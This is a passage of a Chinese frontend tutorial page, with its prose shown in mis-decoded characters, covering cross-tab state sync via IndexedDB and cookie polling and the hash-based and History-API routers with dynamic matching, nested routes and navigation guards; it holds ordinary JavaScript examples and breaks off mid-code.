<span class="hljs-title function_">handleUpdate</span>(cursor.<span class="hljs-property">value</span>.<span class="hljs-property">data</span>);<br>      cursor.<span class="hljs-title function_">delete</span>(); <span class="hljs-comment">// æ¶ˆè´¹ååˆ é™¤</span><br>    &#125;<br>  &#125;;<br>&#125;, <span class="hljs-number">2000</span>);<br></code></pre></td></tr></table></figure><p><strong>é€‚ç”¨åœºæ™¯</strong></p><ul><li>éœ€è¦æ•°æ®æŒä¹…åŒ–çš„ä½é¢‘æ“ä½œï¼ˆå¦‚æ—¥å¿—æ”¶é›†ï¼‰</li></ul><h2 id="åŸºäº-Cookie-çš„è½®è¯¢ï¼ˆä¼ ç»Ÿæ–¹æ¡ˆï¼‰"><a href="#åŸºäº-Cookie-çš„è½®è¯¢ï¼ˆä¼ ç»Ÿæ–¹æ¡ˆï¼‰" class="headerlink" title="åŸºäº Cookie çš„è½®è¯¢ï¼ˆä¼ ç»Ÿæ–¹æ¡ˆï¼‰"></a>åŸºäº Cookie çš„è½®è¯¢ï¼ˆä¼ ç»Ÿæ–¹æ¡ˆï¼‰</h2><p><strong>åŸç†</strong></p><p>å…±äº« Cookie + å®šæ—¶è¯»å–</p><p><strong>ä»£ç ç¤ºä¾‹</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å‘é€æ–¹</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">`sync_flag=<span class="hljs-subst">$&#123;<span class="hljs-built_in">Date</span>.now()&#125;</span>; path=/`</span>;<br><br><span class="hljs-comment">// æ¥æ”¶æ–¹</span><br><span class="hljs-keyword">let</span> lastValue = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> current = <span class="hljs-title function_">getCookie</span>(<span class="hljs-string">&#x27;sync_flag&#x27;</span>);<br>  <span class="hljs-keyword">if</span>(current !== lastValue) &#123;<br>    lastValue = current;<br>    <span class="hljs-title function_">triggerSync</span>();<br>  &#125;<br>&#125;, <span class="hljs-number">1000</span>);<br></code></pre></td></tr></table></figure><p><strong>ç¼ºç‚¹</strong></p><ul><li>æ€§èƒ½å¼€é”€å¤§ï¼ˆä¸æ¨èé«˜é¢‘ä½¿ç”¨ï¼‰</li><li>å­˜å‚¨ç©ºé—´æœ‰é™ï¼ˆ4KBï¼‰</li><li>é€‚ç”¨åœºæ™¯ï¼šå…¼å®¹ IE8 ç­‰è€æ—§æµè§ˆå™¨</li></ul><h2 id="æ–¹æ¡ˆé€‰å‹å†³ç­–ç­–ç•¥"><a href="#æ–¹æ¡ˆé€‰å‹å†³ç­–ç­–ç•¥" class="headerlink" title="æ–¹æ¡ˆé€‰å‹å†³ç­–ç­–ç•¥"></a>æ–¹æ¡ˆé€‰å‹å†³ç­–ç­–ç•¥</h2><pre class="mermaid">graph TD    A[éœ€è¦å…¼å®¹ IE?] -->|æ˜¯| B(localStorage/Cookie)    A -->|å¦| C[éœ€è¦ç¦»çº¿æ”¯æŒ?]    C -->|æ˜¯| D(Service Worker)    C -->|å¦| E[éœ€è¦è·¨åŸŸ?]    E -->|æ˜¯| F(window.postMessage)    E -->|å¦| G[é€šä¿¡é¢‘ç‡?]    G -->é«˜é¢‘ --> H(BroadcastChannel)    G -->ä½é¢‘ --> I(SharedWorker)</pre><h2 id="é¢è¯•è¦ç‚¹"><a href="#é¢è¯•è¦ç‚¹" class="headerlink" title="é¢è¯•è¦ç‚¹"></a>é¢è¯•è¦ç‚¹</h2><ul><li>åŒæºç­–ç•¥ï¼šé™¤ postMessage å¤–æ‰€æœ‰æ–¹æ¡ˆå‡å—åŒæºé™åˆ¶</li><li>æ€§èƒ½è€ƒé‡ï¼šé¿å…è½®è¯¢æ–¹æ¡ˆç”¨äºé«˜é¢‘åœºæ™¯</li><li>å®‰å…¨å®è·µï¼š<ul><li>postMessage å¿…é¡»éªŒè¯ origin</li><li>localStorage é¿å…å­˜å‚¨æ•æ„Ÿæ•°æ®</li></ul></li><li>ç°ä»£æ–¹æ¡ˆï¼šä¼˜å…ˆæ¨è BroadcastChannel + SharedWorker</li><li>å¼‚å¸¸å¤„ç†ï¼šWorker éœ€ç›‘å¬ error äº‹ä»¶ï¼ŒlocalStorage éœ€ try&#x2F;catch</li></ul><h2 id="è¿›é˜¶é—®é¢˜"><a href="#è¿›é˜¶é—®é¢˜" class="headerlink" title="è¿›é˜¶é—®é¢˜"></a>è¿›é˜¶é—®é¢˜</h2><p><strong>Qï¼šå¦‚ä½•å®ç°æµè§ˆå™¨å®Œå…¨å…³é—­åçš„çŠ¶æ€åŒæ­¥ï¼Ÿ</strong></p><p>éœ€ç»“åˆæœåŠ¡ç«¯æ–¹æ¡ˆï¼ˆWebSocket è¿æ¥ + æœ¬åœ°å­˜å‚¨æ¢å¤ï¼‰ï¼Œåœ¨é¡µé¢åŠ è½½æ—¶ä»æœåŠ¡ç«¯è·å–æœ€æ–°çŠ¶æ€ã€‚</p><pre class="mermaid">sequenceDiagram    participant User    participant Browser    participant ServiceWorker    participant Server        User->>Browser: æ‰“å¼€åº”ç”¨    Browser->>ServiceWorker: æ£€æŸ¥ç¼“å­˜çŠ¶æ€    ServiceWorker->>Browser: è¿”å›ç¼“å­˜çŠ¶æ€    Browser->>User: ç«‹å³æ˜¾ç¤ºç•Œé¢        par å¹¶è¡Œå¤„ç†        Browser->>Server: è¯·æ±‚æœ€æ–°çŠ¶æ€        Server->>Browser: è¿”å›çŠ¶æ€æ•°æ®    and        ServiceWorker->>Server: é¢„åŠ è½½å…³é”®èµ„æº    end        Browser->>Browser: æ¯”è¾ƒç¼“å­˜ä¸æœ€æ–°çŠ¶æ€    alt çŠ¶æ€æœ‰æ›´æ–°        Browser->>Browser: å¢é‡æ›´æ–°UI        Browser->>ServiceWorker: ç¼“å­˜æ–°çŠ¶æ€    else çŠ¶æ€æ— æ›´æ–°        Browser->>Browser: ä¿æŒå½“å‰çŠ¶æ€    end</pre><h1 id="å‰ç«¯è·¯ç”±åŸç†"><a href="#å‰ç«¯è·¯ç”±åŸç†" class="headerlink" title="å‰ç«¯è·¯ç”±åŸç†"></a>å‰ç«¯è·¯ç”±åŸç†</h1><h2 id="æ ¸å¿ƒåŸç†æ¦‚è¿°"><a href="#æ ¸å¿ƒåŸç†æ¦‚è¿°" class="headerlink" title="æ ¸å¿ƒåŸç†æ¦‚è¿°"></a>æ ¸å¿ƒåŸç†æ¦‚è¿°</h2><p>å‰ç«¯è·¯ç”±çš„æœ¬è´¨æ˜¯é€šè¿‡ç›‘å¬ URL çš„å˜åŒ–ï¼Œåœ¨ä¸åˆ·æ–°é¡µé¢çš„æƒ…å†µä¸‹æ›´æ–°è§†å›¾ï¼Œä¸»è¦é€šè¿‡ä¸¤ç§æ¨¡å¼å®ç°ï¼š</p><ul><li>Hash æ¨¡å¼</li><li>History æ¨¡å¼</li></ul><h2 id="Hash-æ¨¡å¼ï¼ˆé”šç‚¹è·¯ç”±ï¼‰"><a href="#Hash-æ¨¡å¼ï¼ˆé”šç‚¹è·¯ç”±ï¼‰" class="headerlink" title="Hash æ¨¡å¼ï¼ˆé”šç‚¹è·¯ç”±ï¼‰"></a>Hash æ¨¡å¼ï¼ˆé”šç‚¹è·¯ç”±ï¼‰</h2><p><strong>å®ç°åŸç†</strong></p><ul><li>åˆ©ç”¨ URL ä¸­ # åé¢çš„éƒ¨åˆ†ï¼ˆhashï¼‰çš„å˜åŒ–ä¸ä¼šè§¦å‘é¡µé¢åˆ·æ–°</li><li>ç›‘å¬ hashchange äº‹ä»¶å“åº”è·¯ç”±å˜åŒ–</li><li>é€šè¿‡ location.hash è·å–å½“å‰è·¯ç”±çŠ¶æ€</li></ul><p><strong>æ ¸å¿ƒä»£ç å®ç°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HashRouter</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">routes</span> = &#123;&#125;;<br>    <br>    <span class="hljs-comment">// åˆå§‹åŒ–ç›‘å¬</span><br>    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;load&#x27;</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleRouteChange</span>());<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;hashchange&#x27;</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleRouteChange</span>());<br>  &#125;<br>  <br>  <span class="hljs-comment">// æ³¨å†Œè·¯ç”±</span><br>  <span class="hljs-title function_">addRoute</span>(<span class="hljs-params">path, callback</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">routes</span>[path] = callback || <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;&#125;;<br>  &#125;<br>  <br>  <span class="hljs-comment">// è·¯ç”±å˜åŒ–å¤„ç†</span><br>  <span class="hljs-title function_">handleRouteChange</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> currentHash = location.<span class="hljs-property">hash</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>) || <span class="hljs-string">&#x27;/&#x27;</span>;<br>    <span class="hljs-keyword">const</span> routeHandler = <span class="hljs-variable language_">this</span>.<span class="hljs-property">routes</span>[currentHash];<br>    <br>    <span class="hljs-keyword">if</span> (routeHandler) &#123;<br>      <span class="hljs-title function_">routeHandler</span>();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// 404å¤„ç†</span><br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">routes</span>[<span class="hljs-string">&#x27;/404&#x27;</span>]?.();<br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-comment">// å¯¼èˆªæ–¹æ³•</span><br>  <span class="hljs-title function_">navigate</span>(<span class="hljs-params">path</span>) &#123;<br>    location.<span class="hljs-property">hash</span> = <span class="hljs-string">`#<span class="hljs-subst">$&#123;path&#125;</span>`</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashRouter</span>();<br>router.<span class="hljs-title function_">addRoute</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">renderHomePage</span>());<br>router.<span class="hljs-title function_">addRoute</span>(<span class="hljs-string">&#x27;/about&#x27;</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">renderAboutPage</span>());<br>router.<span class="hljs-title function_">addRoute</span>(<span class="hljs-string">&#x27;/404&#x27;</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">renderNotFound</span>());<br></code></pre></td></tr></table></figure><p><strong>ä¼˜ç¼ºç‚¹åˆ†æ</strong></p><table><thead><tr><th align="left">ä¼˜ç‚¹</th><th align="left">ç¼ºç‚¹</th></tr></thead><tbody><tr><td align="left">âœ… å…¼å®¹æ€§å¥½ï¼ˆIE8+ï¼‰</td><td align="left">âŒ URLä¸­åŒ…å«#ä¸ç¾è§‚</td></tr><tr><td align="left">âœ… æ— éœ€æœåŠ¡å™¨é…ç½®</td><td align="left">âŒ SEOæ”¯æŒæœ‰é™</td></tr><tr><td align="left">âœ… å®ç°ç®€å•</td><td align="left">âŒ åªèƒ½ä½¿ç”¨å­—ç¬¦ä¸²ä¼ å‚</td></tr></tbody></table><h2 id="History-æ¨¡å¼ï¼ˆHTML5è·¯ç”±ï¼‰"><a href="#History-æ¨¡å¼ï¼ˆHTML5è·¯ç”±ï¼‰" class="headerlink" title="History æ¨¡å¼ï¼ˆHTML5è·¯ç”±ï¼‰"></a>History æ¨¡å¼ï¼ˆHTML5è·¯ç”±ï¼‰</h2><p><strong>å®ç°åŸç†</strong></p><ul><li>ä½¿ç”¨ HTML5 History API (pushState, replaceState)</li><li>ç›‘å¬ popstate äº‹ä»¶å“åº”è·¯ç”±å˜åŒ–</li><li>é€šè¿‡ location.pathname è·å–å½“å‰è·¯å¾„</li></ul><p><strong>æ ¸å¿ƒ API</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ·»åŠ æ–°å†å²è®°å½•</span><br>history.<span class="hljs-title function_">pushState</span>(state, title, url);<br><br><span class="hljs-comment">// æ›¿æ¢å½“å‰å†å²è®°å½•</span><br>history.<span class="hljs-title function_">replaceState</span>(state, title, url);<br><br><span class="hljs-comment">// ç›‘å¬å†å²è®°å½•å˜åŒ–</span><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;popstate&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;è·¯ç”±å˜åŒ–:&#x27;</span>, location.<span class="hljs-property">pathname</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>å®Œæ•´å®ç°æ–¹æ¡ˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">HistoryRouter</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">routes</span> = &#123;&#125;;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">init</span>();<br>  &#125;<br>  <br>  <span class="hljs-title function_">init</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-comment">// æ‹¦æˆªæ‰€æœ‰é“¾æ¥ç‚¹å‡»</span><br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (e.<span class="hljs-property">target</span>.<span class="hljs-property">tagName</span> === <span class="hljs-string">&#x27;A&#x27;</span>) &#123;<br>        e.<span class="hljs-title function_">preventDefault</span>();<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">navigate</span>(e.<span class="hljs-property">target</span>.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">&#x27;href&#x27;</span>));<br>      &#125;<br>    &#125;);<br>    <br>    <span class="hljs-comment">// ç›‘å¬æµè§ˆå™¨å‰è¿›/åé€€</span><br>    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;popstate&#x27;</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleRouting</span>());<br>    <br>    <span class="hljs-comment">// åˆå§‹åŠ è½½</span><br>    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;load&#x27;</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleRouting</span>());<br>  &#125;<br>  <br>  <span class="hljs-title function_">addRoute</span>(<span class="hljs-params">path, callback</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">routes</span>[path] = callback;<br>  &#125;<br>  <br>  <span class="hljs-title function_">handleRouting</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> currentPath = location.<span class="hljs-property">pathname</span>;<br>    <span class="hljs-keyword">const</span> routeHandler = <span class="hljs-variable language_">this</span>.<span class="hljs-property">routes</span>[currentPath] || <span class="hljs-variable language_">this</span>.<span class="hljs-property">routes</span>[<span class="hljs-string">&#x27;*&#x27;</span>];<br>    <br>    <span class="hljs-keyword">if</span> (routeHandler) &#123;<br>      <span class="hljs-title function_">routeHandler</span>();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">navigate</span>(<span class="hljs-string">&#x27;/404&#x27;</span>);<br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-title function_">navigate</span>(<span class="hljs-params">path</span>) &#123;<br>    history.<span class="hljs-title function_">pushState</span>(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, path);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleRouting</span>();<br>  &#125;<br>  <br>  <span class="hljs-title function_">replace</span>(<span class="hljs-params">path</span>) &#123;<br>    history.<span class="hljs-title function_">replaceState</span>(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, path);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleRouting</span>();<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä¼˜ç¼ºç‚¹å¯¹æ¯”</strong></p><table><thead><tr><th align="left">ä¼˜ç‚¹</th><th align="left">ç¼ºç‚¹</th></tr></thead><tbody><tr><td align="left">âœ… å¹²å‡€çš„URL</td><td align="left">âŒ éœ€è¦æœåŠ¡å™¨ç«¯æ”¯æŒ</td></tr><tr><td align="left">âœ… å®Œæ•´çš„è·¯å¾„æ§åˆ¶</td><td align="left">âŒ å…¼å®¹æ€§è¦æ±‚ï¼ˆIE10+ï¼‰</td></tr><tr><td align="left">âœ… æ”¯æŒå¤æ‚å‚æ•°ä¼ é€’</td><td align="left">âŒ å®ç°å¤æ‚åº¦æ›´é«˜</td></tr></tbody></table><h2 id="é«˜çº§è·¯ç”±åŠŸèƒ½å®ç°"><a href="#é«˜çº§è·¯ç”±åŠŸèƒ½å®ç°" class="headerlink" title="é«˜çº§è·¯ç”±åŠŸèƒ½å®ç°"></a>é«˜çº§è·¯ç”±åŠŸèƒ½å®ç°</h2><p><strong>åŠ¨æ€è·¯ç”±åŒ¹é…</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è·¯ç”±é…ç½®</span><br><span class="hljs-keyword">const</span> routes = &#123;<br>  <span class="hljs-string">&#x27;/user/:id&#x27;</span>: <span class="hljs-function">(<span class="hljs-params">params</span>) =&gt;</span> <span class="hljs-title function_">showUserProfile</span>(params.<span class="hljs-property">id</span>),<br>  <span class="hljs-string">&#x27;/product/:category/:id&#x27;</span>: <span class="hljs-function">(<span class="hljs-params">params</span>) =&gt;</span> <span class="hljs-title function_">showProduct</span>(params.<span class="hljs-property">category</span>, params.<span class="hljs-property">id</span>)<br>&#125;;<br><br><span class="hljs-comment">// åŒ¹é…å‡½æ•°</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">matchRoute</span>(<span class="hljs-params">path</span>) &#123;<br>  <span class="hljs-keyword">const</span> routeKeys = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(routes);<br>  <br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> route <span class="hljs-keyword">of</span> routeKeys) &#123;<br>    <span class="hljs-keyword">const</span> regex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(<br>      <span class="hljs-string">`^<span class="hljs-subst">$&#123;route.replace(/:\w+/g, <span class="hljs-string">&#x27;([^/]+)&#x27;</span>)&#125;</span>$`</span><br>    );<br>    <br>    <span class="hljs-keyword">const</span> match = path.<span class="hljs-title function_">match</span>(regex);<br>    <span class="hljs-keyword">if</span> (match) &#123;<br>      <span class="hljs-keyword">const</span> params = &#123;&#125;;<br>      <span class="hljs-keyword">const</span> paramNames = [...route.<span class="hljs-title function_">matchAll</span>(<span class="hljs-regexp">/:(\w+)/g</span>)].<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">m</span> =&gt;</span> m[<span class="hljs-number">1</span>]);<br>      <br>      paramNames.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">name, i</span>) =&gt;</span> &#123;<br>        params[name] = match[i + <span class="hljs-number">1</span>];<br>      &#125;);<br>      <br>      <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-attr">handler</span>: routes[route],<br>        params<br>      &#125;;<br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>åµŒå¥—è·¯ç”±å®ç°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è·¯ç”±é…ç½®</span><br><span class="hljs-keyword">const</span> routes = [<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/dashboard&#x27;</span>,<br>    <span class="hljs-attr">component</span>: <span class="hljs-title class_">DashboardLayout</span>,<br>    <span class="hljs-attr">children</span>: [<br>      &#123; <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/overview&#x27;</span>, <span class="hljs-attr">component</span>: <span class="hljs-title class_">Overview</span> &#125;,<br>      &#123; <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/settings&#x27;</span>, <span class="hljs-attr">component</span>: <span class="hljs-title class_">Settings</span> &#125;<br>    ]<br>  &#125;<br>];<br><br><span class="hljs-comment">// è·¯ç”±æ¸²æŸ“ç»„ä»¶</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">RouterView</span>(<span class="hljs-params">&#123; routes &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> currentPath = <span class="hljs-title function_">useCurrentPath</span>();<br>  <span class="hljs-keyword">const</span> matchedRoute = <span class="hljs-title function_">findNestedRoute</span>(routes, currentPath);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">matchedRoute.component</span>&gt;</span></span><br><span class="language-xml">      &#123;matchedRoute.children &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">RouterView</span> <span class="hljs-attr">routes</span>=<span class="hljs-string">&#123;matchedRoute.children&#125;</span> /&gt;</span>&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">matchedRoute.component</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è·¯ç”±å®ˆå«ï¼ˆå¯¼èˆªå®ˆå«ï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AdvancedRouter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">HistoryRouter</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">super</span>();<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">beforeHooks</span> = [];<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">afterHooks</span> = [];<br>  &#125;<br>  <br>  <span class="hljs-title function_">beforeEach</span>(<span class="hljs-params">guard</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">beforeHooks</span>.<span class="hljs-title function_">push</span>(guard);<br>  &#125;<br>  <br>  <span class="hljs-title function_">afterEach</span>(<span class="hljs-params">hook</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">afterHooks</span>.<span class="hljs-title function_">push</span>(hook);<br>  &#125;<br>  <br>  <span class="hljs-keyword">async</span> <span class="hljs-title function_">navigate</span>(<span class="hljs-params">to</span>) &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">from</span> = location.<span class="hljs-property">pathname</span>;<br>    <br>    <span class="hljs-comment">// æ‰§è¡Œå‰ç½®å®ˆå«</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> guard <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">beforeHooks</span>) &#123;<br>      <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">guard</span>(to, <span class="hljs-keyword">from</span>);<br>      <span class="hljs-keyword">if</span> (result === <span class="hljs-literal">false</span> || <span class="hljs-keyword">typeof</span> result === <span class="hljs-string">&#x27;string&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span>; <span class="hljs-comment">// å–æ¶ˆå¯¼èˆª</span><br>      &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// æ‰§è¡Œå¯¼èˆª</span><br>    history.<span class="hljs-title function_">pushState</span>(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, to);<br>    <br>    <span class="hljs-comment">// æ›´æ–°è§†å›¾</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">handleRouting</span>();<br>    <br>    <span class="hljs-comment">// æ‰§è¡Œåç½®é’©å­</span><br>    <span 